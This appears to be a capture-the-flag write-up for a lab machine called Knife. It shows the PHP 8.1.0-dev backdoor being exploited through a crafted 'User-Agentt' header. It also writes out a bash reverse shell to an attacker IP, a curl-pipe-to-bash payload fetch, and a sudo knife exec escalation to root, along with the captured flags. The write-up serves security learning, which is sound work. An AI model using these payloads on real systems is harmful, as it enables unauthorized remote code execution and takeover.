PHP 8.1.0-dev Backdoor

Looking at the HTTP headers of the response from the web server, we find that it is using PHP/8.1.0-dev:

$ curl 10.10.10.242 -I
HTTP/1.1 200 OK
Date: Fri, 03 Sep 2021 11:36:12 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8

The issue is that this development version was released with a backdoor. Putting a header: User-Agentt: zerodiumsystem("whoami"); in the request executes the command whoami (more information here).

Let’s use a reverse shell serving a Bash script with Python:

$ python3 -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...

shell.sh:

#!/bin/bash

bash -i >& /dev/tcp/10.10.16.46/4444 0>&1 

$ nc -nlvp 4444 

$ curl -H 'User-Agentt: zerodiumsystem("curl 10.10.16.46/shell.sh -s | bash");' 10.10.10.242 -s

Finding sudo permissions

We enter the machine as james:

bash-5.0$ whoami
james
bash-5.0$ cat /home/james/user.txt 
3c9359d46d35b73071095b9ef4e0dcf0

This user can execute knife as root without password:

bash-5.0$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

Running knife

Reading the help panel of knife it can be found a way to execute Ruby scripts using knife exec. So, /bin/bash can be executed as root from a Ruby script:

bash-5.0$ echo "system('/bin/bash')" > .priv.rb 
bash-5.0$ sudo knife exec .priv.rb
root@knife:/home/james# shred -u .priv.rb
root@knife:/home/james# cd
root@knife:~# cat root.txt
b631aac1a84b2e5cf9063d641735eb59
